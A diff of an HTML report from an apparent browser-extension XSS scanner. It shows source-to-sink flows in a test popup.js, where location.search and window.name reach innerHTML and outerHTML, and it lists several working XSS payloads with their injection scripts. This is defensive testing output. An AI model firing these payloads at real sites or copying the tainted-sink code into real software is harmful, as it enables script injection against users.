@@ -2,7 +2,7 @@
 <head>
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<title>ScanExt Report - search-params</title>
+<title>ScanExt Report - 2-vulns</title>
 <!-- Bootstrap -->
 <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" rel="stylesheet"/>
 <!-- Poppins -->
@@ -219,7 +219,7 @@
 </div>
 <div class="row files-header">
 <p style="color: white">Folder scanned:</p>
-<p><code id="scanned-folder">search-params</code></p>
+<p><code id="scanned-folder">2-vulns</code></p>
 </div>
 <div class="row main-heading">
 <table class="table table-secondary table-bordered border-dark table-striped">
@@ -238,15 +238,15 @@
 </tr>
 <tr>
 <td><b>Date of Scan</b></td>
-<td id="scan-date">Sat, 22 Jul 2023 14:35:04 +0800</td>
+<td id="scan-date">Sat, 22 Jul 2023 15:06:27 +0800</td>
 </tr>
 <tr>
 <td><b>Vulnerabilities detected</b></td>
-<td id="vulns">1 found</td>
+<td id="vulns">2 found</td>
 </tr>
 <tr>
 <td><b>POCs generated</b></td>
-<td id="pocs">5 found</td>
+<td id="pocs">10 found</td>
 </tr>
 </tbody>
 </table>
@@ -264,7 +264,7 @@
 <div class="card static-result">
 <div class="card-header">
 <span class="float-start">
-<i class="fa fa-file-code-o" style="font-size:20px"></i> <span class="filename" id="vuln-file-1"><b>File:</b> search-params/popup.js</span>
+<i class="fa fa-file-code-o" style="font-size:20px"></i> <span class="filename" id="vuln-file-1"><b>File:</b> 2-vulns/popup.js</span>
 </span>
 </div>
 <div class="card-body">
@@ -290,19 +290,60 @@
     2		    //location.search</code><code class="code-source">
     3		<mark id="code-source-1">    query = window.location.search</mark>	<span class="code-comment">/* Source */</span></code><code>
     ...		...</code><code class="code-sink">
-    12		<mark id="code-sink-1">        elements[i].innerHTML = `Your query is: ${query}`</mark>	<span class="code-comment">/* Sink */</span></code><code>
-    13		    }</code><code>
-    14		}</code><code>
-    15		async function getCurrentTab() {</code>
+    15		<mark id="code-sink-1">        elements[i].innerHTML = `Your query is: ${query}`</mark>	<span class="code-comment">/* Sink */</span></code><code>
+    16		    }</code><code>
+    17		</code><code>
+    18		    var elements = document.getElementsByTagName('div');</code>
     </pre>
 <br>
 <h5><u>Tainted variables</u></h5>
 <p>Tainted data is transmitted from the source to sink along the following route.</p>
 <pre class="code-block"><code class="code-taint">
-    10		<mark class="mark-taint" id="code-taint-1">        var query = decodeURI(query)</mark>	<span class="code-comment">/* Tainted */</span></code>
+    13		<mark class="mark-taint" id="code-taint-1">        var query = decodeURI(query)</mark>	<span class="code-comment">/* Tainted */</span></code>
                     </pre>
 <i>*This code has been beautified by js-beautify.</i>
 </br></p>
+</div>
+</div>
+
+<!-- Source-Sink pair -->
+<div class="card static-result">
+<div class="card-header">
+<span class="float-start">
+<i class="fa fa-file-code-o" style="font-size:20px"></i> <span class="filename" id="vuln-file-2"><b>File:</b> 2-vulns/popup.js</span>
+</span>
+</div>
+<div class="card-body">
+<p class="card-text">
+<div class="row">
+<div class="col-6 source-desc">
+<!-- Source -->
+<h5><u>Source ID: <code id="source-2">window_name</code></u></h5>
+<p id="source-desc-2"><code>window.name</code> can be used as an entry point for user-controlled data due the fact that it's accessible cross-origin. Useful when combined with a resource specified under <code>web_accessible_resources</code>.</p>
+</div>
+<div class="col-6 sink-desc">
+<!-- Sink -->
+<h5><u>Sink ID: <code id="sink-2">outerHTML</code></u></h5>
+<p id="sink-desc-2"><code>.outerHTML</code> when combined with user input can lead to Cross-site Scripting (XSS) vulnerabilities.</p>
+</div>
+</div>
+<br/><br/>
+<!-- Location -->
+<h5><u>Location of vulnerability</u></h5>
+<p>The following code segment shows the location of the source and sink.</p>
+<pre class="code-block" id="code-block-2"><code>
+    3		    query = window.location.search</code><code>
+    4		</code><code>
+    5		    // surprise: window.name</code><code class="code-source">
+    6		<mark id="code-source-2">    hi = window.name</mark>	<span class="code-comment">/* Source */</span></code><code>
+    ...		...</code><code class="code-sink">
+    20		<mark id="code-sink-2">        elements[i].outerHTML = hi</mark>	<span class="code-comment">/* Sink */</span></code><code>
+    21		    }</code><code>
+    22		</code><code>
+    23		}</code>
+    </pre>
+<i>*This code has been beautified by js-beautify.</i>
+</p>
 </div>
 </div>
 </div>
@@ -353,7 +394,7 @@
 <th>Location of Injection</th>
 </tr>
 <tr>
-<td class="consolas" id="payload-1">&lt;image/src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-1">&lt;img src=x onerror=alert(1)&gt;</td>
 <td class="consolas" id="payload-url-1">https://www.example.com</td>
 </tr>
 <tr class="table-head">
@@ -361,8 +402,8 @@
 <th>Time of Alert</th>
 </tr>
 <tr>
-<td id="payload-start-1">Sat, 22 Jul 2023 06:35:23 +0800</td>
-<td id="payload-end-1">Sat, 22 Jul 2023 06:35:25 +0800</td>
+<td id="payload-start-1">Sat, 22 Jul 2023 07:06:45 +0800</td>
+<td id="payload-end-1">Sat, 22 Jul 2023 07:06:48 +0800</td>
 </tr>
 <tr class="table-head">
 <th colspan="2">Script to inject payload</th>
@@ -387,7 +428,7 @@
 <th>Location of Injection</th>
 </tr>
 <tr>
-<td class="consolas" id="payload-2">&lt;image src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-2">&lt;img src/onerror=prompt(8)&gt;</td>
 <td class="consolas" id="payload-url-2">https://www.example.com</td>
 </tr>
 <tr class="table-head">
@@ -395,8 +436,8 @@
 <th>Time of Alert</th>
 </tr>
 <tr>
-<td id="payload-start-2">Sat, 22 Jul 2023 06:35:18 +0800</td>
-<td id="payload-end-2">Sat, 22 Jul 2023 06:35:20 +0800</td>
+<td id="payload-start-2">Sat, 22 Jul 2023 07:06:52 +0800</td>
+<td id="payload-end-2">Sat, 22 Jul 2023 07:06:54 +0800</td>
 </tr>
 <tr class="table-head">
 <th colspan="2">Script to inject payload</th>
@@ -421,7 +462,7 @@
 <th>Location of Injection</th>
 </tr>
 <tr>
-<td class="consolas" id="payload-3">&lt;img/src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-3">&lt;image src/onerror=prompt(8)&gt;</td>
 <td class="consolas" id="payload-url-3">https://www.example.com</td>
 </tr>
 <tr class="table-head">
@@ -429,8 +470,8 @@
 <th>Time of Alert</th>
 </tr>
 <tr>
-<td id="payload-start-3">Sat, 22 Jul 2023 06:35:29 +0800</td>
-<td id="payload-end-3">Sat, 22 Jul 2023 06:35:31 +0800</td>
+<td id="payload-start-3">Sat, 22 Jul 2023 07:06:45 +0800</td>
+<td id="payload-end-3">Sat, 22 Jul 2023 07:06:47 +0800</td>
 </tr>
 <tr class="table-head">
 <th colspan="2">Script to inject payload</th>
@@ -455,7 +496,7 @@
 <th>Location of Injection</th>
 </tr>
 <tr>
-<td class="consolas" id="payload-4">&lt;img src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-4">&lt;img/src/onerror=prompt(8)&gt;</td>
 <td class="consolas" id="payload-url-4">https://www.example.com</td>
 </tr>
 <tr class="table-head">
@@ -463,8 +504,8 @@
 <th>Time of Alert</th>
 </tr>
 <tr>
-<td id="payload-start-4">Sat, 22 Jul 2023 06:35:27 +0800</td>
-<td id="payload-end-4">Sat, 22 Jul 2023 06:35:29 +0800</td>
+<td id="payload-start-4">Sat, 22 Jul 2023 07:06:47 +0800</td>
+<td id="payload-end-4">Sat, 22 Jul 2023 07:06:49 +0800</td>
 </tr>
 <tr class="table-head">
 <th colspan="2">Script to inject payload</th>
@@ -489,7 +530,7 @@
 <th>Location of Injection</th>
 </tr>
 <tr>
-<td class="consolas" id="payload-5">&lt;img src=x onerror=alert(1)&gt;</td>
+<td class="consolas" id="payload-5">&lt;image/src/onerror=prompt(8)&gt;</td>
 <td class="consolas" id="payload-url-5">https://www.example.com</td>
 </tr>
 <tr class="table-head">
@@ -497,14 +538,218 @@
 <th>Time of Alert</th>
 </tr>
 <tr>
-<td id="payload-start-5">Sat, 22 Jul 2023 06:35:31 +0800</td>
-<td id="payload-end-5">Sat, 22 Jul 2023 06:35:34 +0800</td>
+<td id="payload-start-5">Sat, 22 Jul 2023 07:06:54 +0800</td>
+<td id="payload-end-5">Sat, 22 Jul 2023 07:06:56 +0800</td>
 </tr>
 <tr class="table-head">
 <th colspan="2">Script to inject payload</th>
 </tr>
 <tr>
 <td class="consolas" colspan="2" id="payload-script-5">window.location.search=`?q={payload}`</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Packet Info</th>
+</tr>
+<tr>
+<td colspan="2" id="payload-packet-info-5">N.A.</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</p>
+</div>
+</div>
+<!-- Source -->
+<div class="card dynamic-result">
+<div class="card-header">
+<i class="fa fa-flag-checkered" style="font-size:20px"></i> <span style="font-size: 18px"><b>Source 2 :</b> <u>window.name</u></span>
+</div>
+<div class="card-body">
+<p class="card-text">
+<div class="row dynamic-info">
+<div class="row">
+<!-- Payload List -->
+<div class="col-4">
+<i class="dynamic-info-icons fa fa-file-text-o" style="font-size:36px;"></i>
+<h5><b>Payload list:</b></h5>
+<code><u id="payload-list">SHARED/payloads.txt</u></code>
+</div>
+<!-- No. of tested payloads -->
+<div class="col-4">
+<i class="dynamic-info-icons fa fa-bomb" style="font-size:36px;"></i>
+<h5><b>Applicable:</b></h5>
+<code><u id="tested-payloads">0 payloads</u></code>
+</div>
+<!-- No. of successful payloads -->
+<div class="col-4">
+<i class="dynamic-info-icons fa fa-bug" style="font-size:36px;"></i>
+<h5><b>Successful:</b></h5>
+<code><u id="success-payloads">5 payloads</u></code>
+</div>
+</div>
+<div class="row table-row">
+<!-- Payload Info -->
+<h3 id="payload-no-1"><u><b>Payload #1</b></u></h3>
+<table class="table border-dark payload-table mb-3">
+<tbody>
+<tr class="table-head">
+<th>Payload which triggered XSS</th>
+<th>Location of Injection</th>
+</tr>
+<tr>
+<td class="consolas" id="payload-1">&lt;img src=x onerror=alert(1)&gt;</td>
+<td class="consolas" id="payload-url-1">https://www.example.com</td>
+</tr>
+<tr class="table-head">
+<th>Time of Injection</th>
+<th>Time of Alert</th>
+</tr>
+<tr>
+<td id="payload-start-1">Sat, 22 Jul 2023 07:07:07 +0800</td>
+<td id="payload-end-1">Sat, 22 Jul 2023 07:07:09 +0800</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Script to inject payload</th>
+</tr>
+<tr>
+<td class="consolas" colspan="2" id="payload-script-1">window.name = `{payload}`;</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Packet Info</th>
+</tr>
+<tr>
+<td colspan="2" id="payload-packet-info-1">N.A.</td>
+</tr>
+</tbody>
+</table>
+<!-- Payload Info -->
+<h3 id="payload-no-1"><u><b>Payload #2</b></u></h3>
+<table class="table border-dark payload-table mb-3">
+<tbody>
+<tr class="table-head">
+<th>Payload which triggered XSS</th>
+<th>Location of Injection</th>
+</tr>
+<tr>
+<td class="consolas" id="payload-2">&lt;img src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-url-2">https://www.example.com</td>
+</tr>
+<tr class="table-head">
+<th>Time of Injection</th>
+<th>Time of Alert</th>
+</tr>
+<tr>
+<td id="payload-start-2">Sat, 22 Jul 2023 07:07:14 +0800</td>
+<td id="payload-end-2">Sat, 22 Jul 2023 07:07:16 +0800</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Script to inject payload</th>
+</tr>
+<tr>
+<td class="consolas" colspan="2" id="payload-script-2">window.name = `{payload}`;</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Packet Info</th>
+</tr>
+<tr>
+<td colspan="2" id="payload-packet-info-2">N.A.</td>
+</tr>
+</tbody>
+</table>
+<!-- Payload Info -->
+<h3 id="payload-no-1"><u><b>Payload #3</b></u></h3>
+<table class="table border-dark payload-table mb-3">
+<tbody>
+<tr class="table-head">
+<th>Payload which triggered XSS</th>
+<th>Location of Injection</th>
+</tr>
+<tr>
+<td class="consolas" id="payload-3">&lt;image src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-url-3">https://www.example.com</td>
+</tr>
+<tr class="table-head">
+<th>Time of Injection</th>
+<th>Time of Alert</th>
+</tr>
+<tr>
+<td id="payload-start-3">Sat, 22 Jul 2023 07:07:07 +0800</td>
+<td id="payload-end-3">Sat, 22 Jul 2023 07:07:09 +0800</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Script to inject payload</th>
+</tr>
+<tr>
+<td class="consolas" colspan="2" id="payload-script-3">window.name = `{payload}`;</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Packet Info</th>
+</tr>
+<tr>
+<td colspan="2" id="payload-packet-info-3">N.A.</td>
+</tr>
+</tbody>
+</table>
+<!-- Payload Info -->
+<h3 id="payload-no-1"><u><b>Payload #4</b></u></h3>
+<table class="table border-dark payload-table mb-3">
+<tbody>
+<tr class="table-head">
+<th>Payload which triggered XSS</th>
+<th>Location of Injection</th>
+</tr>
+<tr>
+<td class="consolas" id="payload-4">&lt;img/src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-url-4">https://www.example.com</td>
+</tr>
+<tr class="table-head">
+<th>Time of Injection</th>
+<th>Time of Alert</th>
+</tr>
+<tr>
+<td id="payload-start-4">Sat, 22 Jul 2023 07:07:09 +0800</td>
+<td id="payload-end-4">Sat, 22 Jul 2023 07:07:11 +0800</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Script to inject payload</th>
+</tr>
+<tr>
+<td class="consolas" colspan="2" id="payload-script-4">window.name = `{payload}`;</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Packet Info</th>
+</tr>
+<tr>
+<td colspan="2" id="payload-packet-info-4">N.A.</td>
+</tr>
+</tbody>
+</table>
+<!-- Payload Info -->
+<h3 id="payload-no-1"><u><b>Payload #5</b></u></h3>
+<table class="table border-dark payload-table mb-3">
+<tbody>
+<tr class="table-head">
+<th>Payload which triggered XSS</th>
+<th>Location of Injection</th>
+</tr>
+<tr>
+<td class="consolas" id="payload-5">&lt;image/src/onerror=prompt(8)&gt;</td>
+<td class="consolas" id="payload-url-5">https://www.example.com</td>
+</tr>
+<tr class="table-head">
+<th>Time of Injection</th>
+<th>Time of Alert</th>
+</tr>
+<tr>
+<td id="payload-start-5">Sat, 22 Jul 2023 07:07:15 +0800</td>
+<td id="payload-end-5">Sat, 22 Jul 2023 07:07:17 +0800</td>
+</tr>
+<tr class="table-head">
+<th colspan="2">Script to inject payload</th>
+</tr>
+<tr>
+<td class="consolas" colspan="2" id="payload-script-5">window.name = `{payload}`;</td>
 </tr>
 <tr class="table-head">
 <th colspan="2">Packet Info</th>
